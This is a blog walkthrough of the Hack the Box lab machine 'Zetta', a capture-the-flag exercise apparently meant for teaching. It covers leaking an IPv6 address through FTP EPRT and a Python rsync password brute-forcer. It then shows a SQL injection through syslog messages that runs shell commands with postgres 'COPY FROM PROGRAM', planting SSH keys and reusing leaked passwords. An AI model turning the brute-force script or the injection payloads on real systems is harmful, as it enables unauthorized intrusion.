---
layout:     post
title:      HacktheBox - Padraignix 'Zetta' Walkthough
title2:     Hack the Box - Zetta
date:       2020-3-01 12:00:00 -0400
summary:    HTB Zetta machine walkthrough. Starting with an FTP FXP IPv6 leak, to an rsync brute-force for user access to the machine. Once on, chained custom syslog messages with a postgres SQL injection to pivot user access. Finally, a dubious password policy leads to using discovered credentials and adapting them to the root password for system level access.
categories: hack-the-box
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,writeup,walkthrough,zetta,ftp,rsync,postgres,brute force,sql injection,sql,ipv6,fxp
tags:
 - htb 
 - walkthrough
 - writeup
 - ftp
 - rsync
 - postgres
 - brute-force
 - sql
 - ipv6
---
<h1>Introduction</h1>

<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-zetta/infocard.PNG' | relative_url }}">
</p>

<p>Let me just start with - what a box! Zetta was to this point the most complex machine I have completed and I enjoyed every second of it. I personally compare the difficulty of this machine to Bankrobber, which was rated as Insane, despite Zetta being marked as Hard.</p>

<p>Starting with an FTP FXP IPv6 leak, to an rsync brute-force and abuse we get user access to the machine. Once on, we chain custom crafted syslog messages using logger with a postgres command injection to pivot user access. Finally, a dubious password policy leads to using discovered credentials and adapting them to the root password for system level access.</p>

<p>Without any further delay, let us step through it!</p>

<h1>Initial Recon</h1>

<p>We start with our regular NMAP scan to see what we are working with.<p>

{% highlight shell %}
root@kali:~# nmap -sV -sC -p- 10.10.10.156
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-04 20:31 EST
Nmap scan report for 10.10.10.156
Host is up (0.019s latency).
Not shown: 65532 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
22/tcp open   ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp open   http    nginx
|_http-server-header: nginx
|_http-title: Ze::a Share
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<p>Alright, an FTP, SSH service and a web Nginx service. Let's start Burp and take a look at what is offered on the web page first.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/recon-burp.PNG' | relative_url }}">
</p>

<p>Taking a look at the main page it seems to be a business offering for managed storage. If we go to the bottom of the page we find something quite interesting - a set of credentials!</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/recon-ftpcreds.PNG' | relative_url }}">
</p>

<p>If we refresh the page the credentials change. That seems potentially odd, so a bit of digging and sure enough we find the section of code in the page that is generating these "credentials" - seemingly the same 32 random characters for username and password.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/recon-ftprandom.PNG' | relative_url }}">
</p>

<p>Alright, so these are probably not true credentials, however it seems an interesting angle to pursue. Let's try using the information to log in to the FTP service.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Zetta# nc 10.10.10.156 21
USER nGLYoOO4gILBf2s86vVt6MRg8sapDJ7z
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 500 allowed.
220-Local time is now 23:50. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User nGLYoOO4gILBf2s86vVt6MRg8sapDJ7z OK. Password required
PASS nGLYoOO4gILBf2s86vVt6MRg8sapDJ7z
230-This server supports FXP transfers
230-OK. Current restricted directory is /
230-0 files used (0%) - authorized: 10 files
230 0 Kbytes used (0%) - authorized: 1024 Kb
{% endhighlight %}

<p>While it is excellent that we are in, there unfortunately doesn't seem to be anything directly available to us. The interesting part really comes down to the metnion of FXP transfers. Back on the main web page where we found the credentials there was also mention of "<i><b>We support native FTP with FXP enabled. We also support RFC2428</b></i>". I wasn't as familiar with FXP so took the opportunity to do a little external reading with the <a href="https://tools.ietf.org/html/rfc2428">RFC docs</a>.

<blockquote>
This document provides a specification for a way that FTP can communicate data connection endpoint information for network protocols other than IPv4
<br>
 ...
<br>
The EPRT command allows for the specification of an extended address for the data connection
</blockquote>

<p>Interesting, so interpreting this another way there is a possibility that this machine is also configured to use IPv6. Since we don't have a way to know what the IPv6 address is as is, we should be able to leverage the <code>EPRT</code> command to connect back to our own IPv6 address using the FTP server's IPv6 interface, leaking the address to us. Let's start Wireshark on our end and give this a shot.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/recon-ftpfxp.PNG' | relative_url }}">
</p>

<p>And if we check our Wireshark capture.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/recon-ftpipv6.PNG' | relative_url }}">
</p>

<p>Excellent, we have the server address of <i>dead:beef::250:56ff:fea2:4d93</i>. Note that this IPv6 address seems to change on every reboot, so on subsequent attempts it was required to redo this portion.</p>

<h1>User exploitation</h1>

<p>Now that we have the IPv6 address, let's attempt to rerun our NMAP scan and see if anything else pops out.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Zetta# nmap -6 -sV -sC -p- dead:beef::250:56ff:fea2:4d93
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-05 18:27 EST
Nmap scan report for dead:beef::250:56ff:fea2:4d93
Host is up (0.019s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Pure-FTPd
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp   open  http    nginx
|_http-server-header: nginx
|_http-title: Ze::a Share
8730/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:a2:4d:93
|_      manuf: VMware
{% endhighlight %}

<p>Oh ho! We have an rsync service available on IPv6 where it was not on IPv4. What happens if we poke around there.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/user-rsyncnmap.PNG' | relative_url }}">
</p>

<p>This is looking more promising, excellent. Unfortunately trying to enumerate all of the listed modules leads us to access denied. At this point I started scratching my head a bit until I realized that the modules were all the standard directories in a Unix machine, however /etc was missing... Hum, let's see if that is just a coincidence.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/user-rsyncetc.PNG' | relative_url }}">
</p>

<p>Bingo! Ok let's see if we can grab a copy of /etc and sync it locally for further analysis.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/user-rsyncetcsync.PNG' | relative_url }}">
</p>

<p>Once we have the files locally we take a look at the more obvious spots - passwd, ftpusers, backups, but it is only once we look at the rsyncd.conf file do we really notice something interesting.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Zetta/etc# cat rsyncd.conf | tail -n 10
[home_roy]
	path = /home/roy
	read only = no
	# Authenticate user for security reasons.
	uid = roy
	gid = roy
	auth users = roy
	secrets file = /etc/rsyncd.secrets
	# Hide home module so that no one tries to access it.
	list = false
{% endhighlight %}

<p>Another hidden directory! We also have the user provided on top of it, excellent. Unfortunately, we don't have the password and trying to access /home/roy results in access denied.</p>

<p>With the username however, let's see if we can script up a simple bruteforce to iterate through the rockyou password list. Who knows, we might get lucky.</p>

{% highlight python %}
#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
import subprocess

def bruteforce(password):
    os.environ["RSYNC_PASSWORD"] = password
    try:
        p1 = subprocess.run('rsync -vazh rsync://roy@[dead:beef::250:56ff:fea2:4d93]/home_roy --port 8730',check=True, shell=True,stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
        if p1.returncode == 0:
            print("PASSWORD Found! roy/" + password)
    except subprocess.CalledProcessError as e:
        pass

if __name__ == "__main__":

    f = open(sys.argv[1], "r")
    num = 0

    for x in f:
        x = x.rstrip('\n')
        bruteforce(x)
        num +=1
        if(num % 100 == 0):
           print("Num: " + str(num) + " - attempted: " + x)
{% endhighlight %}

<p>And once we let is run for awhile... we get lucky!</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/user-rsyncbrute.PNG' | relative_url }}">
</p>

<p>With <code>roy</code>'s credentials, we can now sync and upload files to <code>/home/roy</code>.

{% highlight shell %}
root@kali:~/Desktop/HTB/Zetta# rsync -v rsync://roy@[dead:beef::250:56ff:fea2:4d93]/home_roy --port 8730
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

You must have explicit, authorized permission to access this rsync
server. Unauthorized attempts and actions to access or use this 
system may result in civil and/or criminal penalties. 

All activities performed on this device are logged and monitored.

****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

@ZE::A staff

This rsync server is solely for access to the zetta master server.
The modules you see are either provided for "Backup access" or for
"Cloud sync".


Password: 
receiving file list ... done
drwxr-xr-x          4,096 2019/07/28 06:52:29 .
lrwxrwxrwx              9 2019/07/27 06:57:06 .bash_history
-rw-r--r--            220 2019/07/27 03:03:28 .bash_logout
-rw-r--r--          3,526 2019/07/27 03:03:28 .bashrc
-rw-r--r--            807 2019/07/27 03:03:28 .profile
-rw-------          4,752 2019/07/27 05:24:24 .tudu.xml
-r--r--r--             33 2019/07/27 05:24:24 user.txt

sent 20 bytes  received 184 bytes  81.60 bytes/sec
total size is 9,347  speedup is 45.82
{% endhighlight %}

<p>Well we can see our user.txt flag present! Also, there is an interesting .tudu.xml file. I mention it as it will become useful later on. As we need to proceed past just the user flag, instead of downloading the files locally let's upload our ssh authorized_user's file to allow SSH connection.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/user-rsyncssh.PNG' | relative_url }}">
</p>

<p>And just like that, we have our user access. Despite the amount of effort so far, this is just the beginning for Zetta!</p>

<h1>Root exploitation</h1>

<p>Now remember when I mentioned that tudu file? Well if we do a quick search we can find that "<i>TuDu is a comand line interface to manage hierarchical todo</i>". Excellent, let's run it and see what is in it.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/root-tudu.PNG' | relative_url }}">
</p>

<p>If we follow along, we can pretty much mentally map the workflow that got us here so far - HTTP server -> FTP -> Rsync. Taking a bit of a leap here, but let's make an assumption that our next step will have something to do with Syslog.</p>

{% highlight shell %}
       62% SYSLOG Server                                                                                         |
           [X] Decide server: syslog-ng vs. rsyslog                                                              |
           [X] Install server                                                                                    |
           [X] Configure server                                                                                  |
           [X] Check postgresql log for errors after configuration                                               |
           [X] Prototype/test DB push of syslog events                                                           |
           [ ] Testing                                                                                           |
           [ ] Rework syslog configuration to push all events to the DB                                          |
           [ ] Find/write GUI for syslog-db access/view       
{% endhighlight %}

<p>Alright, let's see if we can find any configs or other tidbits to help point us in the right direction. During the search we did remember that there was mention of .git repositories in the rsync.conf file.</p>

{% highlight shell %}
# *** WORK IN PROGRESS *** 
# Allow access to /etc to sync configuration files throughout the complete
# cloud server farm. IP addresses from https://ip-ranges.amazonaws.com/ip-ranges.json
#
[etc]
	comment = Backup access to /etc. Also used for cloud sync access.
	path = /etc
	# Do not leak .git repos onto the not so trusted slave servers in the cloud.
	exclude = .git
	# Temporarily disabled access to /etc for security reasons, the networks are
	# have been found to access the share! Only allow 127.0.0.1, deny 0.0.0.0/0!
	#hosts allow = 104.24.0.54 13.248.97.0/24 52.94.69.0/24 52.219.72.0/22
	hosts allow = 127.0.0.1/32
	hosts deny = 0.0.0.0/0
	# Hiding it for now.
	list = false
{% endhighlight %}

<p>We end up finding /etc/rsyslog.d has a .git repo configured. We also have enough entitlements to clone it to a location where we have access to the files.</p>

{% highlight shell %}
roy@zetta:/tmp$ git clone /etc/rsyslog.d
Cloning into 'rsyslog.d'...
done.

roy@zetta:~$ cat /tmp/rsyslog.d/pgsql.conf
### Configuration file for rsyslog-pgsql
### Changes are preserved

# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
#
# Used default template from documentation/source but adapted table
# name to syslog_lines so the Ruby on Rails application Maurice is
# coding can use this as SyslogLine object.
#
template(name="sql-syslog" type="list" option.sql="on") {
  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
  property(name="msg")
  constant(value="','")
  property(name="timereported" dateformat="pgsql" date.inUTC="on")
  constant(value="')")
}

# load module
module(load="ompgsql")

# Only forward local7.info for testing.
local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
{% endhighlight %}

<p>Ok, so if we understand the config above properly, it looks like all local7.info syslog messages are triggering this pgsql.conf rule and ultimately being forwarded to a postgres instance.</p>

<p>If we poke around a bit more, we can see where postgres stores its own logs. If you are following my mindset, we're trying to map the data model of these logs so we can start testing different approaches.</p>

{% highlight shell %}
cat postgresql.conf | grep data_dir
data_directory = '/var/lib/postgresql/11/main'		# use data in another directory
{% endhighlight %}

{% highlight shell %}
roy@zetta:/tmp/rsyslog.d$ psql --host localhost -p 5432 -U postgres -W 
Password: 
psql: FATAL:  password authentication failed for user "postgres"
FATAL:  password authentication failed for user "postgres"
{% endhighlight %}

{% highlight shell %}
roy@zetta:/etc/postgresql/11/main$ tail -n1 /var/log/postgresql/postgresql-11-main.log
2019-11-07 18:14:01.561 EST [4242] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' \','2019-11-07 23:13:51'))
{% endhighlight %}

<p>Ok, great, we now have any idea of what syslog messages get sent to posgres, local7.info, and we also have the location where the logs get forwarded to based on the rsyslog.d conf, postgresql-11-main.log. Thanks to that last location also now understand the format that these logs are being inserted into the postgres instance.</p>

<p>With all this information we have a good idea of how to proceed. We need to send our own custom syslog message, where we will attempt to execute a SQL injection through the postgres insert statement.</p>

<p>For the first part, the easiest way would be to use a utility like logger. We can pass it an attribute <code>-p local7.info</code> to ensure our message get's picked up by the postgres rule.</p>

<p>As far as the SQL injection payload, there are several ways to do this. During my investigations I figured out where the user postgres's homedirectory and SSH directory was located, therefore I decided to go with the ssh/authorized_keys route.</p>

<p>It took a lot of different tweaks and attempts to get the right character escapes, but finally I was able to get successful execution with the following.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/root-sqlinject.PNG' | relative_url }}">
</p>


<p>And because why not, I then crafted another payload to cat the file and see if it was properly updated.</p>

{% highlight shell %}
2019-11-08 16:45:46.505 EST [1537] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' \', now()); COPY syslog_lines FROM PROGRAM $$cat /var/lib/postgresql/.ssh/authorized_keys$$; -- #','2019-11-08 21:45:46')
2019-11-08 16:45:46.510 EST [1540] postgres@syslog WARNING:  there is no transaction in progress
tail: postgresql-11-main.log: file truncated
2019-11-08 16:47:28.425 EST [1540] postgres@syslog ERROR:  invalid input syntax for integer: "'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCr2BPHlixOqPa/cIzYufceN3xIqJVtpUrPwWh0kPwparSO7bCHpuU/ZmMw/wEOSEYqu68MuwH8Qqj7YwaPolU3UJK6toX598y9swOPrKmnZMBdIycMtp4ANw2+75tXQ8AiP1YKHRwTgDg8QC40l396Be45gq2c+u6vTJ2LhbJh4zteGVGg4aIziDl/b7DUA5MKh6oxa4s52D6C9CBrSziYsLzkL+UOCPC63uzIWc+BiteZkek9xJodUxidjlnWO52vZz/2ZXAu7j7RAcdr4bHY/UzZbAYCTAVpHZLdVYkZYoxMnYb5/xw7ONxgWSsuOUWjEAXgBL7PoHZd2VRbeKwn root@kali' 
	ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCr2BPHlixOqPa/cIzYufceN3xIqJVtpUrPwWh0kPwparSO7bCHpuU/ZmMw/wEOSEYqu68MuwH8Qqj7YwaPolU3UJK6toX598y9swOPrKmnZMBdIycMtp4ANw2+75tXQ8AiP1YKHRwTgDg8QC40l396Be45gq2c+u6vTJ2LhbJh4zteGVGg4aIziDl/b7DUA5MKh6oxa4s52D6C9CBrSziYsLzkL+UOCPC63uzIWc+BiteZkek9xJodUxidjlnWO52vZz/2ZXAu7j7RAcdr4bHY/UzZbAYCTAVpHZLdVYkZYoxMnYb5/xw7ONxgWSsuOUWjEAXgBL7PoHZd2VRbeKwn root@kali"
{% endhighlight %}

<p>Great! Now let's see if this was successful by attempting to SSH in.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/root-psqlssh.PNG' | relative_url }}">
</p>

<p>One step closer... almost there, hopefully.</p>

<p>As user postgres we have access to some additional postgres config files we did not previously.</p>

{% highlight shell %}
postgres@zetta:~$ cat .psql_history 
CREATE DATABASE syslog;
\c syslog
CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
\d syslog_lines
ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
postgres@zetta:~$ 
{% endhighlight %}

<p>Now I attempted to use the password with the postgres user to see if we could confirm it was working. Unfortunately postgres' password seemed to have been changed by this point. Let's file it away as we look around a bit more.</p>

<p>After what felt way too long I started going back to previous points of investigation. If we take a look at the tudu list once more we can figure out a very interesting tidbit.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/root-tudusec.PNG' | relative_url }}">
</p>

<p>That seems suspiciously like the format of the password we saw in the .psql_history. Interesting...very interesting. Let's see if it can be as easy as replacing the userid portion to "root" and attempting log in as <code>root</code> using the password <code>sup3rs3cur3p4ass@root</code>.</p>

<p align="center">
<img src="{{ '/assets/htb-zetta/root-owned.PNG' | relative_url }}">
</p>

<p>Bam! Thus finishes the saga of Zetta. As mentioned at the start of the article this was so far the most involved machine I have gone through in HTB. I thoroughly enjoyed every moment of it and look forward to further machines of this nature. With that said, thanks folks, until next time! 

<h1>Extra fun</h1>

<p>A little extra note about this machine. I will be holding a "Gamified InfoSec Learning" workshop for local university students in a few weeks. I plan on using Zetta and this walkthrough to go through the practical portion of the workshop with the students. Look forward to seeing a writeup and extra material once the workshop is completed.</p>